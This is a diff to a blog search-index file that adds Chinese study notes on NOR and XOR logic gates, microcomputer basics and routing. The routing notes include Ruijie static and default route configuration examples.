height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 10px; margin-left: 10px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">A</div></div></div></foreignObject><text x="10" y="14" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">A</text></switch></g><rect x="0" y="20" width="20" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 30px; margin-left: 10px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">B</div></div></div></foreignObject><text x="10" y="34" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">B</text></switch></g><rect x="70" y="70" width="40" height="40" fill="#ffffff" stroke="#000000" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 90px; margin-left: 71px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; ">≧1</div></div></div></foreignObject><text x="90" y="94" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">≧1</text></switch></g><path d="M 30 80 L 67.76 80" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 61.88 83.5 L 68.88 80 L 61.88 76.5" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="all"/><path d="M 30 100 L 65.76 99.06" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 59.98 102.71 L 66.88 99.03 L 59.79 95.71" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="all"/><rect x="10" y="70" width="20" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 80px; margin-left: 20px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">A</div></div></div></foreignObject><text x="20" y="84" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">A</text></switch></g><rect x="10" y="90" width="20" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 100px; margin-left: 20px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">B</div></div></div></foreignObject><text x="20" y="104" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">B</text></switch></g><path d="M 117.06 90.02 L 147.76 90.32" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><ellipse cx="114.56" cy="90" rx="2.5" ry="2.5" fill="none" stroke="#000000" pointer-events="all"/><path d="M 137.83 95.72 L 148.88 90.33 L 137.94 84.72" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="all"/><rect x="150" y="80" width="20" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 90px; margin-left: 160px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">F</div></div></div></foreignObject><text x="160" y="94" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">F</text></switch></g></g><switch><g requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"/><a transform="translate(0,-5)" xlink:href="https://desk.iodraw.com/support/solutions/articles/16000042487" target="_blank"><text text-anchor="middle" font-size="10px" x="50%" y="100%">Viewer does not support full SVG 1.1</text></a></switch></svg></p>
+<table border="1px " cellspacing="0"   style="width: 350px;height: 200px">
+    <tr align="center" >
+        <td colspan="3" >或非逻辑真值表</td>
+    </tr>
+    <tr >
+        <td align="center">A</td>
+        <td align="center">B</td>
+        <td align="center">F</td>
+    </tr>
+        <tr align=＂center＂>
+        <td align="center">0</td>
+        <td align="center">0</td>
+        <td align="center">1</td>
+    </tr>
+    <tr align=＂center＂>
+        <td align="center">0</td>
+        <td align="center">1</td>
+        <td align="center">0</td>
+    </tr>
+     <tr align=＂center＂>
+        <td align="center">1</td>
+        <td align="center">0</td>
+        <td align="center">0</td>
+    </tr>
+     <tr align=＂center＂>
+        <td align="center">1</td>
+        <td align="center">1</td>
+        <td align="center">0</td>
+    </tr>
+
+
+
+
+
+<h3 id="异或运算"><a href="#异或运算" class="headerlink" title="异或运算"></a>异或运算</h3><p>异或逻辑的布尔代数表达式：F &#x3D;<span style="text-decoration: overline">A</span> • B + A • <span style="text-decoration: overline">B</span> &#x3D; A ⊕ B</p>
+<p>异或运算是两个变量的运算</p>
+<p>运算规则：相同为0 相异为1</p>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<p><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="161px" height="41px" viewBox="-0.5 -0.5 161 41" content="&lt;mxfile host=&quot;www.iodraw.com&quot; modified=&quot;2022-12-21T10:51:49.216Z&quot; agent=&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54&quot; etag=&quot;h2sefSAKZrn9_1DFE3v3&quot; version=&quot;13.3.6&quot; type=&quot;device&quot;&gt;&lt;diagram id=&quot;XiAWfELhHhgkPWUriSza&quot; name=&quot;第 1 页&quot;&gt;7Vddb5swFP01PC4CDPl4DKHZl6ZNyqS1jx6+BW8GM+M0pL9+NpjvVFmrtNWm8YDwsX3NPef6YCy0Scu3AufJJ06AWa5NSguFluu63lzdNXCsAQctayAWlBioA3b0HgxoG3RPCRSDgZJzJmk+BCOeZRDJAYaF4IfhsFvOhqvmOIYJsIswm6LfKJFJjS7dRYe/AxonzcrOfFX3pLgZbDIpEkz4oQehKwttBOeyfkrLDTDNXcNLPW/7QG/7YgIy+UcTPvrF+1+EInH9gc0/ixJ99d94Ro07zPYmY3U3sQt5bGg4JFTCLseRbh+U0hYKEpmyajAKcJHX5N/SEtR6gYkKQkL54Ps6LQuqeoCnIMVRDWkmIEOcqZyWyEOng2egpCdBg2GjfNxG7shRD4afx3C1mnI15gkystZVp1o8h2zIUiEF/wkbzrioRiO7ulSPmral+m1CuyUPyKQyz1LXo8Y/QU2DCWBY0rth+FN8mRW+cKoWbpVZjYRBI8YLvhcRmEn9ihzFmSg8DiSxiEFOAlXqtVk/XdCGjv+CjnTwnyqouxwGarbMSwnqTARdTxRVjiRH7sVorJQNI6UGKCUD7VtUfQPWpiOlhOjpgYCC3uPvVSgtbK4zqXLzA8sPday95EX9FXMu44OL8zbonigN97ls0HcnJAf/HMnea5OMzltToXaTbMwp4xlUjqSwnvNUbXOq8mtfGtnZ0KlUy4x27KF+ZuuCoCpDEPosQLO4naaSvtaNma1proGbCvCdRQOEZX98eOy32sgG/LFP851JNq7OGxdxUce+jGU6C2/mz08XzWNt07VXs1X/8sZxZwj1uhcva6repBS3f/1+b/8vxkePy2941ewO+bUo3Z8SuvoN&lt;/diagram&gt;&lt;/mxfile&gt;"><defs/><g><rect x="60" y="0" width="40" height="40" fill="#ffffff" stroke="#000000" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 38px; height: 1px; padding-top: 20px; margin-left: 61px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; ">&#x3D;1</div></div></div></foreignObject><text x="80" y="24" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">&#x3D;1</text></switch></g><path d="M 20 10 L 57.76 10" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 51.88 13.5 L 58.88 10 L 51.88 6.5" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="all"/><path d="M 20 30 L 55.76 29.06" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 49.98 32.71 L 56.88 29.03 L 49.79 25.71" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="all"/><rect x="0" y="0" width="20" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 10px; margin-left: 10px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">A</div></div></div></foreignObject><text x="10" y="14" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">A</text></switch></g><rect x="0" y="20" width="20" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 30px; margin-left: 10px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">B</div></div></div></foreignObject><text x="10" y="34" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">B</text></switch></g><path d="M 104.56 20 L 137.76 20.32" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="stroke"/><path d="M 127.83 25.72 L 138.88 20.33 L 127.94 14.72" fill="none" stroke="#000000" stroke-miterlimit="10" pointer-events="all"/><rect x="140" y="10" width="20" height="20" fill="none" stroke="none" pointer-events="all"/><g transform="translate(-0.5 -0.5)"><switch><foreignObject style="overflow: visible; text-align: left;" pointer-events="none" width="100%" height="100%" requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"><div xmlns="http://www.w3.org/1999/xhtml" style="display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 20px; margin-left: 150px;"><div style="box-sizing: border-box; font-size: 0; text-align: center; "><div style="display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; ">F</div></div></div></foreignObject><text x="150" y="24" fill="#000000" font-family="Helvetica" font-size="12px" text-anchor="middle">F</text></switch></g></g><switch><g requiredFeatures="http://www.w3.org/TR/SVG11/feature#Extensibility"/><a transform="translate(0,-5)" xlink:href="https://desk.iodraw.com/support/solutions/articles/16000042487" target="_blank"><text text-anchor="middle" font-size="10px" x="50%" y="100%">Viewer does not support full SVG 1.1</text></a></switch></svg></p>
+<table border="1px " cellspacing="0"   style="width: 350px;height: 200px">
+    <tr align="center" >
+        <td colspan="3" >异或逻辑真值表</td>
+    </tr>
+    <tr >
+        <td align="center">A</td>
+        <td align="center">B</td>
+        <td align="center">F</td>
+    </tr>
+        <tr align=＂center＂>
+        <td align="center">0</td>
+        <td align="center">0</td>
+        <td align="center">0</td>
+    </tr>
+         <tr align=＂center＂>
+        <td align="center">0</td>
+        <td align="center">1</td>
+        <td align="center">1</td>
+    </tr>
+        <tr align=＂center＂>
+        <td align="center">1</td>
+        <td align="center">0</td>
+        <td align="center">1</td>
+    </tr>
+    <tr align=＂center＂>
+        <td align="center">1</td>
+        <td align="center">1</td>
+        <td align="center">0</td>
+    </tr>
+
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>微机原理</category>
+      </categories>
+      <tags>
+        <tag>微机原理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>微机原理基绪论</title>
+    <url>/posts/97f746d8/</url>
+    <content><![CDATA[<h2 id="微型计算机的基本组成及各部分的功能及作用"><a href="#微型计算机的基本组成及各部分的功能及作用" class="headerlink" title="微型计算机的基本组成及各部分的功能及作用"></a>微型计算机的基本组成及各部分的功能及作用</h2><p>世界第一台计算机：1946年</p>
+<p>第一代：电子管数字计算机ENIAC</p>
+<p>第二代：晶体管计算机1956年</p>
+<p>第三代：集成电路计算机1964年</p>
+<p>第四代：大规模集成电路和超大规模集成电路计算机1970年</p>
+<div class= "mermaid">
+graph TD;
+    微型计算机系统-->硬件系统;
+       微型计算机系统-->软件系统;
+    硬件系统-->主机系统;
+    硬件系统-->外部设备;
+    主机系统-->CPU;
+    主机系统-->存储器;
+    主机系统-->总线;
+    主机系统-->I/O接口;
+    软件系统-->系统软件;
+    软件系统-->应用软件;
+    外部设备-->鼠标/键盘;
+       系统软件-->Android/Windows/Linux/Mac/IOS;
+       应用软件-->QQ/微信;
+</div>
+
+
+
+
+
+<h2 id="微型计算机的基本工作过程"><a href="#微型计算机的基本工作过程" class="headerlink" title="微型计算机的基本工作过程"></a>微型计算机的基本工作过程</h2><p>冯·诺依曼（“现代计算机之父”）</p>
+<ul>
+<li>计算机五大部件：运算器、控制器、存储器、输入和输出设备</li>
+<li>计算机工作原理：存储程序、程序控制</li>
+<li>指令按顺序组成，放于存储器</li>
+<li>指令和数据采用二进制编码</li>
+<li>控制器控制整个程序和数据的存储以继程序的执行</li>
+<li>运算器为核心，所有的执行都经过运算器</li>
 </ul>
-<p>例： 10101.10   &#x3D; 15.8 </p>
-<p>整数部分： 0001        0101  &#x3D;   1     5       小数部分： 1000  &#x3D;  8 </p>
-<h3 id="十六进制转二进制"><a href="#十六进制转二进制" class="headerlink" title="十六进制转二进制"></a>十六进制转二进制</h3><ul>
-<li>0A9.67  H &#x3D; 1010  1001.0110  0111  B </li>
-<li>每位数字用四位二进制数表示</li>
-</ul>
-<p>整数： A &#x3D;1010  9&#x3D; 1001          小数： 6 &#x3D; 0110    7 0111  </p>
+<br>
+
+<p>指令执行过程：取指令→分析指令→读取操作数→执行指令→存放结果</p>
+<blockquote>
+<p>顺序执行：一条指令执行完了在执行吓一条指令</p>
+<p>并行执行：同时执行两条或多条指令</p>
+</blockquote>
 ]]></content>
       <categories>
         <category>学习</category>
@@ -9226,6 +9463,390 @@ Ruijie(config-if-GigabitEthernet 0&#x2F;1)#spanning-tree bpdufilter enable</code
       </tags>
   </entry>
   <entry>
+    <title>路由技术介绍</title>
+    <url>/posts/f2727247/</url>
+    <content><![CDATA[<div class="danger">
+
+<blockquote>
+<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
+</blockquote>
+</div>
+
+<h2 id="路由技术介绍"><a href="#路由技术介绍" class="headerlink" title="路由技术介绍"></a>路由技术介绍</h2><h3 id="为什么需要路由"><a href="#为什么需要路由" class="headerlink" title="为什么需要路由"></a>为什么需要路由</h3><ul>
+<li>PC的网卡在进行发送数据的时候，网络层将检查目的IP与本网卡的IP地址是否处于一个网段<ul>
+<li>如果属于一个网段，则直接用ARP解析目的IP的MAC地址 </li>
+<li>如果不属于一个网段，则用ARP解析网关的MAC地址</li>
+</ul>
+</li>
+<li>二层交换网络（同一广播域&#x2F;VLAN）内，不同网段的主机之间无法直接通信</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104121.png" alt="1" loading="lazy"></p>
+<h3 id="路由的定义"><a href="#路由的定义" class="headerlink" title="路由的定义"></a>路由的定义</h3><ul>
+<li>从一个接口上收到数据包，根据数据包的目的地址进行定向和转发的过程 </li>
+<li>路由器依据路由表选择下一跳地址&#x2F;出接口并转发数据，实现跨IP网段通信</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104128.png" alt="2" loading="lazy"></p>
+<h4 id="直接路由数据通信分析"><a href="#直接路由数据通信分析" class="headerlink" title="直接路由数据通信分析"></a>直接路由数据通信分析</h4><ul>
+<li>直接路由：同一个IP网络内的通信 </li>
+<li>回想一下：同一个LAN中的PC1和PC2之间的通信过程：PC1&gt;ping 192.168.1.200</li>
+</ul>
+<ol>
+<li>PC1封装一个负载为ICMP Echo的IP报文：源IP&#x3D;192.168.1.100 目的IP&#x3D;192.168.1.200 </li>
+<li>PC1将IP报文封装到以太网帧中，源MAC为本地网卡的MAC，需要确定目的地的MAC </li>
+<li>PC1先判断目标IP是否处于本地子网，结果发现“是” 方式：本地IP与本地掩码是否等于目标IP与本地掩码，如果结果相等，则说明目标IP处于本地子网 </li>
+<li>查本地ARP缓存是否存在目标IP（PC2）对 应的MAC，如果不存在，则通过ARP获取</li>
+<li>成功封装以太网帧，源MAC为PC1的MAC， 目标MAC为PC2的MAC，从PC1网卡发出</li>
+<li>交换机根据MAC地址表转发以太网帧。</li>
+<li>PC2收到以太网帧，解封装出ICMP Echo 需要回复ICMP Reply的IP报文 源IP&#x3D;192.168.1.200 目的IP&#x3D;192.168.1.100</li>
+<li>PC2重复②-⑤的处理流程</li>
+</ol>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104133.png" alt="3" loading="lazy"></p>
+<h3 id="间接路由数据通信分析"><a href="#间接路由数据通信分析" class="headerlink" title="间接路由数据通信分析"></a>间接路由数据通信分析</h3><ul>
+<li>间接路由：不同IP网络内的通信 </li>
+<li>再思考一下：如果PC2与其他LAN中的PC3通信，又该如何：PC2&gt;ping 192.168.2.100</li>
+</ul>
+<p>1、PC2封装一个负载为ICMP Echo的IP报文：源IP&#x3D;192.168.1.200 目的IP&#x3D;192.168.2.100</p>
+<p>2、将IP报文封装到以太网帧中，源MAC为本地网卡的MAC，需要确定目的地的MAC</p>
+<p>3、PC2先判断目标IP是否处于本地子网，结果发现“不是” </p>
+<p>4、PC2如果配置了默认网关，查本地ARP缓存是 否存在网关IP对应的MAC，如果不存在，则通过 ARP获取ARP表项</p>
+<p>5、成功封装以太网帧，源MAC为PC2的MAC， 目标MAC为网关的MAC。由网卡接口发出</p>
+<p>6、交换机根据MAC地址表转发以太网帧，将会发送给网关</p>
+<p>7、网关路由器收到以太网帧，解封装出IP报文。根据报文中的目 标IP信息寻找出接口，在出接口重新封装以太网帧，再发出</p>
+<p>8、PC3收到以太网帧，解封装出ICMP Echo，需要回复ICMP  Reply，源IP&#x3D;192.168.2.100 目的IP&#x3D;192.168.1.200</p>
+<p>8、PC3收到以太网帧，解封装出ICMP Echo，需要回复ICMP  Reply，源IP&#x3D;192.168.2.100 目的IP&#x3D;192.168.1.200</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104140.png" alt="4" loading="lazy"></p>
+<h3 id="认识路由设备"><a href="#认识路由设备" class="headerlink" title="认识路由设备"></a>认识路由设备</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104144.png" alt="5" loading="lazy"></p>
+<h3 id="路由的下一跳"><a href="#路由的下一跳" class="headerlink" title="路由的下一跳"></a>路由的下一跳</h3><ul>
+<li>路由设备进行路由转发，下一台设备的端口IP地址 </li>
+<li>下一跳地址由路由表决定，PC客户端的默认下一跳地址通常称为“网关” <ul>
+<li>如图，PC2想要与PC3通信</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104149.png" alt="6" loading="lazy"></p>
+<ul>
+<li>下一跳地址是路由设备根据路由表选择的最佳路径 <ul>
+<li>如图，PC2想要与PC3通信</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104153.png" alt="7" loading="lazy"></p>
+<h3 id="路由表的构成与维护"><a href="#路由表的构成与维护" class="headerlink" title="路由表的构成与维护"></a>路由表的构成与维护</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104158.png" alt="8" loading="lazy"></p>
+<h3 id="路由表的构成"><a href="#路由表的构成" class="headerlink" title="路由表的构成"></a>路由表的构成</h3><p>路由表是路由器转发数据报文的判断依据。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104202.png" alt="9" loading="lazy"></p>
+<h4 id="路由表的度量值"><a href="#路由表的度量值" class="headerlink" title="路由表的度量值"></a>路由表的度量值</h4><ul>
+<li>度量值（Metric）：路由协议用来衡量路径优劣的参数。表示到达目的地的代价总和</li>
+<li>影响度量值的因素：线路带宽、跳数、线路延迟·、线路使用率、线路可信度等</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104207.png" alt="10" loading="lazy"></p>
+<h3 id="路由表的内容"><a href="#路由表的内容" class="headerlink" title="路由表的内容"></a>路由表的内容</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104210.png" alt="11" loading="lazy"></p>
+<h3 id="管理距离"><a href="#管理距离" class="headerlink" title="管理距离"></a>管理距离</h3><ul>
+<li>管理距离（Administrative Distance），也叫优先级，用来衡量路由源的可信度 </li>
+<li>管理距离值越低，可信度越高。只有可信度最高的路由会被添加进路由表</li>
+<li>管理距离默认值由厂商自定义</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104214.png" alt="12" loading="lazy"></p>
+<h3 id="路由加表原则"><a href="#路由加表原则" class="headerlink" title="路由加表原则"></a>路由加表原则</h3><p>只有最佳路径才会被添加进路由表中，形成路由条目</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104217.png" alt="13" loading="lazy"></p>
+<h3 id="路由选路原则-——-最长子网掩码匹配原则"><a href="#路由选路原则-——-最长子网掩码匹配原则" class="headerlink" title="路由选路原则 —— 最长子网掩码匹配原则"></a>路由选路原则 —— 最长子网掩码匹配原则</h3><ul>
+<li><p>路由设备基于数据包的目的IP地址，按照最长子网掩码匹配原则查找路由表 </p>
+</li>
+<li><p>根据查询结果转发。查询无果则丢弃数据包</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104223.png" alt="14" loading="lazy"></p>
+</li>
+</ul>
+<h2 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h2><h3 id="静态路由-1"><a href="#静态路由-1" class="headerlink" title="静态路由"></a>静态路由</h3><ul>
+<li>由网络管理员手工配置的路由信息，当网络拓扑发生变化时，管理员需要手工修改静态路由信息 </li>
+<li>静态路由信息是本地有效的，不会传递给其他的路由器 </li>
+<li>静态路由一般适用于比较简单的网络环境，大型和复杂的网络环境通常不宜采用静态路由 使用静态路由好处是网络安全保密性高 </li>
+<li>使用全局配置命令ip route，配置静态路由 <ul>
+<li>下一跳地址必须是直连网络上可达的地址 </li>
+<li>点对点连接时，下一跳地址可用出接口代替</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104229.png" alt="15" loading="lazy"></p>
+<h3 id="静态路由配置案例1-——-基础配置"><a href="#静态路由配置案例1-——-基础配置" class="headerlink" title="静态路由配置案例1 —— 基础配置"></a>静态路由配置案例1 —— 基础配置</h3><ul>
+<li>在3台路由器上配置静态路由，使Net 1与Net 2能互相通信 <ul>
+<li>选择100M链路，路径为：Net1-R1-R2-R3-Net2</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.2
+R2(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.1
+R2(config)#ip route 192.168.2.0 255.255.255.0 172.16.1.6
+R3(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.5</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104233.png" alt="16" loading="lazy"></p>
+<h3 id="静态路由配置案例1-——-查看静态路由"><a href="#静态路由配置案例1-——-查看静态路由" class="headerlink" title="静态路由配置案例1 —— 查看静态路由"></a>静态路由配置案例1 —— 查看静态路由</h3><ul>
+<li>在特权用户模式显示IP路由表<ul>
+<li>ruijie#show ip route</li>
+</ul>
+</li>
+<li>查看R1、R2和R3的路由表</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1#show ip route
+C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1 
+S 192.168.2.0&#x2F;24 [1&#x2F;0] via 172.16.1.2</code></pre>
+
+<pre class="language-none"><code class="language-none">R2#show ip route
+C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2 
+C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
+S 192.168.1.0&#x2F;24 [1&#x2F;0] via 172.16.1.1
+S 192.168.2.0&#x2F;24 [1&#x2F;0] via 172.16.1.6</code></pre>
+
+<pre class="language-none"><code class="language-none">R3#show ip route
+C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
+C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S 192.168.1.0&#x2F;24 [1&#x2F;0] via 172.16.1.5</code></pre>
+
+
+
+<h3 id="静态路由配置案例2-——-默认路由"><a href="#静态路由配置案例2-——-默认路由" class="headerlink" title="静态路由配置案例2 —— 默认路由"></a>静态路由配置案例2 —— 默认路由</h3><ul>
+<li>默认静态路由是特殊的静态路由，它的目标网络和子网掩码均为0.0.0.0（默认路由有可能是动态路由）</li>
+<li>在R1和R3上配置默认路由，使R1与R3的100M链路故障时，可以使用10M链路</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1(config)#ip route 0.0.0.0 0.0.0.0 172.16.1.10
+R3(config)#ip route 0.0.0.0 0.0.0.0 172.16.1.9</code></pre>
+
+<pre class="language-none"><code class="language-none">R1#show ip route
+C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5 
+C 172.16.1.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;2
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+S* 0.0.0.0&#x2F;0 [1&#x2F;0] via 172.16.1.10</code></pre>
+
+<pre class="language-none"><code class="language-none">R3#show ip route
+C 172.16.1.4&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
+C 192.168.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;5
+C 172.16.1.8&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1 
+S* 0.0.0.0&#x2F;0 [1&#x2F;0] via 172.16.1.9</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620104239.png" alt="17" loading="lazy"></p>
+<h3 id="静态路由配置案例3-——-浮动静态路由"><a href="#静态路由配置案例3-——-浮动静态路由" class="headerlink" title="静态路由配置案例3 —— 浮动静态路由"></a>静态路由配置案例3 —— 浮动静态路由</h3><ul>
+<li>浮动路由就是在静态路由的基础上，加上管理距离参数，管理距离越小，可信度越高 </li>
